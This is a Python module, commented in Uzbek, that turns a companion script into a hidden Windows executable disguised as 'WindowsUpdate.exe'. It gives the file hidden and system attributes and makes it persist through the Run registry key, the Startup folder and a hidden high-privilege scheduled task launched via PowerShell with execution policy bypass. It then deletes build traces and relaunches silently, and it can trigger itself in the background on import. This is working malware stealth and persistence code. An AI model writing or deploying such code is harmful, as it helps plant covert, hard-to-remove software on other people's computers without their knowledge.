# build_and_hide.py - AUTO BUILD & PERSISTENCE
"""
Bu modul dasturni avtomatik ravishda:
1. PyInstaller orqali .exe ga aylantiradi
2. Yashirin papkaga ko'chiradi
3. Startup'ga qo'shadi
4. Registry'ga yozadi

DIQQAT: Faqat Python script mode'da ishlaydi!
"""

import os
import sys
import subprocess
import shutil
import logging
import time
import winreg
from pathlib import Path
import getpass

logger = logging.getLogger(__name__)

# ==================== CONFIG ====================
HIDDEN_DIR = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Crypto" / "System"
EXE_NAME = "WindowsUpdate.exe"
STARTUP_NAME = "Windows Update Service"

# ==================== CHECK IF ALREADY BUILT ====================
def is_already_built():
    """Dastur allaqachon build qilingan (.exe) ekanligini tekshirish"""
    return getattr(sys, 'frozen', False)

# ==================== BUILD TO EXE ====================
def build_to_exe():
    """
    PyInstaller orqali dasturni .exe ga aylantirish
    
    Returns:
        str: .exe fayl yo'li yoki None
    """
    try:
        logger.info("Starting build process...")
        
        # PyInstaller o'rnatilganligini tekshirish
        try:
            import PyInstaller
        except ImportError:
            logger.error("PyInstaller not installed!")
            logger.info("Installing PyInstaller...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
        
        # Build config
        main_script = Path(__file__).parent / "main.py"
        if not main_script.exists():
            logger.error("main.py not found!")
            return None
        
        # Output papka
        output_dir = Path(__file__).parent / "dist"
        output_exe = output_dir / "main" / "main.exe"
        
        # nircmd.exe yo'li
        nircmd_path = Path(__file__).parent / "nircmd.exe"
        
        # PyInstaller buyrug'i
        cmd = [
            "pyinstaller",
            "--onedir",  # Bir papkada
            "--noconsole",  # Console yo'q
            "--icon=NONE",  # Icon yo'q
            "--clean",  # Tozalash
            "--noconfirm",  # Tasdiqlash yo'q
            str(main_script)
        ]
        
        # nircmd.exe qo'shish (agar mavjud bo'lsa)
        if nircmd_path.exists():
            cmd.extend(["--add-binary", f"{nircmd_path};."])
        
        logger.info(f"Building: {' '.join(cmd)}")
        
        # Build jarayoni
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300  # 5 daqiqa
        )
        
        if result.returncode != 0:
            logger.error(f"Build failed: {result.stderr}")
            return None
        
        # .exe tekshirish
        if output_exe.exists():
            logger.info(f"Build successful: {output_exe}")
            return str(output_exe)
        else:
            logger.error("EXE not found after build!")
            return None
            
    except subprocess.TimeoutExpired:
        logger.error("Build timeout (5 min)")
        return None
    except Exception as e:
        logger.error(f"Build error: {e}")
        return None

# ==================== MIGRATE TO HIDDEN DIR ====================
def migrate_to_hidden(exe_path):
    """
    .exe ni yashirin papkaga ko'chirish
    
    Args:
        exe_path (str): Build qilingan .exe yo'li
    
    Returns:
        str: Yangi .exe yo'li
    """
    try:
        logger.info(f"Migrating: {exe_path}")
        
        # Yashirin papka yaratish
        HIDDEN_DIR.mkdir(parents=True, exist_ok=True)
        
        # Maqsad yo'l
        target_exe = HIDDEN_DIR / EXE_NAME
        
        # Ko'chirish
        if Path(exe_path).exists():
            # Agar allaqachon mavjud bo'lsa - o'chirish
            if target_exe.exists():
                try:
                    target_exe.unlink()
                except:
                    pass
            
            # Ko'chirish
            shutil.copy2(exe_path, target_exe)
            logger.info(f"Migrated to: {target_exe}")
            
            # Hidden attribut qo'shish
            try:
                subprocess.run(
                    ["attrib", "+h", "+s", str(HIDDEN_DIR)],
                    capture_output=True,
                    timeout=5
                )
                logger.info("Hidden attribute set")
            except:
                pass
            
            return str(target_exe)
        else:
            logger.error("Source EXE not found!")
            return None
            
    except Exception as e:
        logger.error(f"Migration error: {e}")
        return None

# ==================== ADD TO STARTUP ====================
def add_to_startup(exe_path):
    """
    .exe ni Windows startup'ga qo'shish
    
    Args:
        exe_path (str): .exe fayl yo'li
    
    Returns:
        bool: Muvaffaqiyatli yoki yo'q
    """
    try:
        logger.info("Adding to startup...")
        
        # 1. Registry (HKCU)
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
            winreg.CloseKey(key)
            logger.info("Registry startup added")
        except Exception as e:
            logger.error(f"Registry error: {e}")
        
        # 2. Startup folder
        try:
            startup_folder = Path(
                os.environ.get("APPDATA", "")
            ) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            
            startup_exe = startup_folder / f"{STARTUP_NAME}.exe"
            
            if not startup_exe.exists():
                shutil.copy2(exe_path, startup_exe)
                logger.info(f"Startup folder: {startup_exe}")
        except Exception as e:
            logger.error(f"Startup folder error: {e}")
        
        # 3. Task Scheduler (Backup)
        try:
            task_name = "Windows Update Service"
            
            ps_script = f'''
$action = New-ScheduledTaskAction -Execute '{exe_path}'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest

Register-ScheduledTask -TaskName "{task_name}" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
'''
            
            subprocess.run(
                ["powershell", "-WindowStyle", "Hidden", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
                capture_output=True,
                timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
            logger.info("Task Scheduler added")
        except Exception as e:
            logger.error(f"Task Scheduler error: {e}")
        
        return True
        
    except Exception as e:
        logger.error(f"Startup error: {e}")
        return False

# ==================== START NEW INSTANCE ====================
def start_new_instance(exe_path):
    """
    Yangi .exe instance'ni ishga tushirish
    
    Args:
        exe_path (str): .exe fayl yo'li
    """
    try:
        logger.info(f"Starting new instance: {exe_path}")
        
        creationflags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        
        subprocess.Popen(
            [exe_path],
            creationflags=creationflags,
            shell=False,
            cwd=str(Path(exe_path).parent)
        )
        
        logger.info("New instance started")
        
        # Current script'ni to'xtatish
        time.sleep(2)
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Start error: {e}")

# ==================== CLEANUP ====================
def cleanup_build_files():
    """Build fayllarini tozalash"""
    try:
        logger.info("Cleaning up build files...")
        
        # Build papkalarni o'chirish
        folders = ["build", "dist", "__pycache__"]
        for folder in folders:
            folder_path = Path(__file__).parent / folder
            if folder_path.exists():
                shutil.rmtree(folder_path, ignore_errors=True)
                logger.info(f"Removed: {folder_path}")
        
        # .spec faylni o'chirish
        spec_file = Path(__file__).parent / "main.spec"
        if spec_file.exists():
            spec_file.unlink()
            logger.info("Removed: main.spec")
            
    except Exception as e:
        logger.error(f"Cleanup error: {e}")

# ==================== MAIN BUILD & HIDE FUNCTION ====================
def build_and_hide():
    """
    Asosiy funksiya: Build + Migrate + Startup
    
    Returns:
        bool: Muvaffaqiyatli yoki yo'q
    """
    try:
        # Agar allaqachon build qilingan bo'lsa - skip
        if is_already_built():
            logger.info("Already built (.exe mode)")
            return True
        
        logger.info("=" * 50)
        logger.info("BUILD & HIDE STARTED")
        logger.info("=" * 50)
        
        # 1. Build to .exe
        logger.info("Step 1: Building to .exe...")
        exe_path = build_to_exe()
        
        if not exe_path:
            logger.error("Build failed!")
            return False
        
        logger.info(f"âœ… Build successful: {exe_path}")
        
        # 2. Migrate to hidden dir
        logger.info("Step 2: Migrating to hidden dir...")
        hidden_exe = migrate_to_hidden(exe_path)
        
        if not hidden_exe:
            logger.error("Migration failed!")
            return False
        
        logger.info(f"âœ… Migrated: {hidden_exe}")
        
        # 3. Add to startup
        logger.info("Step 3: Adding to startup...")
        add_to_startup(hidden_exe)
        logger.info("âœ… Startup added")
        
        # 4. Cleanup
        logger.info("Step 4: Cleaning up...")
        cleanup_build_files()
        logger.info("âœ… Cleanup done")
        
        # 5. Start new instance
        logger.info("Step 5: Starting new instance...")
        start_new_instance(hidden_exe)
        
        logger.info("=" * 50)
        logger.info("BUILD & HIDE COMPLETED")
        logger.info("=" * 50)
        
        return True
        
    except Exception as e:
        logger.error(f"Build & Hide error: {e}")
        return False

# ==================== CHECK IF NEED BUILD ====================
def should_build():
    """
    Build kerakligini tekshirish
    
    Returns:
        bool: True - build kerak, False - kerak emas
    """
    # Agar allaqachon .exe mode bo'lsa - build kerak emas
    if is_already_built():
        return False
    
    # Agar yashirin papkada .exe mavjud bo'lsa - build kerak emas
    target_exe = HIDDEN_DIR / EXE_NAME
    if target_exe.exists():
        logger.info(f"EXE already exists: {target_exe}")
        return False
    
    # Aks holda - build kerak
    return True

# ==================== AUTO BUILD (Main.py uchun) ====================
def auto_build_on_start():
    """
    Dastur boshlanishida avtomatik build
    
    main.py da chaqirish uchun:
    ```python
    from build_and_hide import auto_build_on_start
    auto_build_on_start()  # Start'da
    ```
    """
    try:
        if should_build():
            logger.info("Auto-build triggered!")
            
            # Background'da build qilish (bloklamaslik uchun)
            import threading
            thread = threading.Thread(target=build_and_hide, daemon=True)
            thread.start()
            
            logger.info("Build started in background")
        else:
            logger.info("Build not needed")
            
    except Exception as e:
        logger.error(f"Auto-build error: {e}")

# ==================== CLI MODE ====================
if __name__ == "__main__":
    # Direct run
    import argparse
    
    parser = argparse.ArgumentParser(description="Build & Hide Tool")
    parser.add_argument("--build", action="store_true", help="Build to .exe")
    parser.add_argument("--migrate", type=str, help="Migrate .exe to hidden dir")
    parser.add_argument("--startup", type=str, help="Add .exe to startup")
    parser.add_argument("--full", action="store_true", help="Full process (build + migrate + startup)")
    
    args = parser.parse_args()
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    if args.full:
        build_and_hide()
    elif args.build:
        exe = build_to_exe()
        print(f"Built: {exe}")
    elif args.migrate:
        hidden = migrate_to_hidden(args.migrate)
        print(f"Migrated: {hidden}")
    elif args.startup:
        add_to_startup(args.startup)
        print("Startup added")
    else:
        parser.print_help()